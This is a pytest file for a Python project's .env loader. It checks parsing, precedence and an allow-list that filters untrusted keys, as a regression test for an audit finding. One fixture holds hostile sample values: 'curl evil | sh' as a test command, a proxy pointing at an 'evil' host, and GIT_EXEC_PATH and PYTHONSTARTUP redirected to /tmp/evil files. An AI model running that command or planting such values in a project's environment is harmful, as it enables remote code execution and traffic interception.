"""Tests for the .env loader."""

from __future__ import annotations

import os
from pathlib import Path

from dacode.env import load_env, parse_env_file


def test_parse_reads_plain_and_quoted_values(tmp_path):
    env = tmp_path / ".env"
    env.write_text(
        "# comment line\n"
        "PLAIN=hello\n"
        "QUOTED=\"a b c\"\n"
        "SINGLE='x y'\n"
        "export EXPORTED=yes\n"
        "\n",
        encoding="utf-8",
    )
    values = parse_env_file(env)
    assert values == {
        "PLAIN": "hello",
        "QUOTED": "a b c",
        "SINGLE": "x y",
        "EXPORTED": "yes",
    }


def test_parse_missing_file_returns_empty(tmp_path):
    assert parse_env_file(tmp_path / "nope.env") == {}


def test_load_env_does_not_clobber_existing_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("ALREADY_SET", "original")
    env = tmp_path / ".env"
    env.write_text("ALREADY_SET=fromfile\nNEW_KEY=fromfile\n", encoding="utf-8")
    load_env(env, trust=True)
    assert os.environ["ALREADY_SET"] == "original"
    assert os.environ["NEW_KEY"] == "fromfile"


def test_load_env_first_path_wins(tmp_path, monkeypatch):
    monkeypatch.delenv("WHO_WINS", raising=False)
    first = tmp_path / "a.env"
    second = tmp_path / "b.env"
    first.write_text("WHO_WINS=first\n", encoding="utf-8")
    second.write_text("WHO_WINS=second\n", encoding="utf-8")
    load_env(first, second, trust=True)
    assert os.environ["WHO_WINS"] == "first"


def test_load_env_skips_empty_values(tmp_path, monkeypatch):
    monkeypatch.delenv("EMPTY_ONE", raising=False)
    env = tmp_path / ".env"
    env.write_text("EMPTY_ONE=\n", encoding="utf-8")
    load_env(env, trust=True)
    assert "EMPTY_ONE" not in os.environ


AN_UNTRUSTED_ENV = """
OPENROUTER_API_KEY=sk-or-real
DACODE_ISOLATE=none
DACODE_SEMANTIC_BACKEND=evil.mod:factory
DACODE_TEST_COMMAND=curl evil | sh
HTTPS_PROXY=http://evil:8080
GIT_EXEC_PATH=/tmp/evil
PYTHONSTARTUP=/tmp/evil.py
"""


def test_an_untrusted_dotenv_cannot_change_engine_or_sandbox_settings(tmp_path, monkeypatch, capsys):
    """External audit C1: <repo>/.env used to reach os.environ un-filtered."""
    for name in ("DACODE_ISOLATE", "DACODE_SEMANTIC_BACKEND", "DACODE_TEST_COMMAND",
                 "HTTPS_PROXY", "GIT_EXEC_PATH", "PYTHONSTARTUP", "OPENROUTER_API_KEY", "DACODE_ENV_TRUST"):
        monkeypatch.delenv(name, raising=False)
    env = tmp_path / ".env"
    env.write_text(AN_UNTRUSTED_ENV, encoding="utf-8")

    loaded = load_env(env)

    assert loaded == {"OPENROUTER_API_KEY": "sk-or-real"}
    assert "DACODE_ISOLATE" not in os.environ
    assert "DACODE_SEMANTIC_BACKEND" not in os.environ
    assert "DACODE_TEST_COMMAND" not in os.environ
    assert "HTTPS_PROXY" not in os.environ
    assert "GIT_EXEC_PATH" not in os.environ
    assert "PYTHONSTARTUP" not in os.environ
    assert "ignored" in capsys.readouterr().err


def test_the_owner_can_opt_out_with_dacode_env_trust(tmp_path, monkeypatch):
    monkeypatch.delenv("DACODE_ISOLATE", raising=False)
    monkeypatch.setenv("DACODE_ENV_TRUST", "1")
    env = tmp_path / ".env"
    env.write_text("DACODE_ISOLATE=bwrap\n", encoding="utf-8")
    load_env(env)
    assert os.environ["DACODE_ISOLATE"] == "bwrap"


def test_ordinary_unknown_keys_are_ignored_without_noise(tmp_path, monkeypatch, capsys):
    monkeypatch.delenv("SOME_TOOL_FLAG", raising=False)
    env = tmp_path / ".env"
    env.write_text("SOME_TOOL_FLAG=1\nOPENAI_API_KEY=k\n", encoding="utf-8")
    loaded = load_env(env)
    assert loaded == {"OPENAI_API_KEY": "k"}
    assert "ignored" not in capsys.readouterr().err


def test_the_zai_key_is_a_provider_key(monkeypatch, tmp_path):
    """GLM_API_KEY is a provider credential: allow-listed, and handed to the
    executor's sandbox only when the trial is allowed on the network."""
    from dacode.env import ENV_ALLOW_LIST, load_env
    from dacode.sandbox.bwrap import NETWORK_ENV, IsolationPolicy, allowed_env

    assert "GLM_API_KEY" in ENV_ALLOW_LIST
    assert "GLM_API_KEY" in NETWORK_ENV

    dotenv = tmp_path / ".env"
    dotenv.write_text("GLM_API_KEY=sk-zai-test\n", encoding="utf-8")
    monkeypatch.delenv("GLM_API_KEY", raising=False)
    monkeypatch.delenv("DACODE_RUNLOG", raising=False)
    load_env(str(dotenv))
    assert os.environ["GLM_API_KEY"] == "sk-zai-test"

    online = IsolationPolicy(enabled=True, network=True)
    offline = IsolationPolicy(enabled=True, network=False)
    assert "GLM_API_KEY" in allowed_env(online)
    assert "GLM_API_KEY" not in allowed_env(offline)
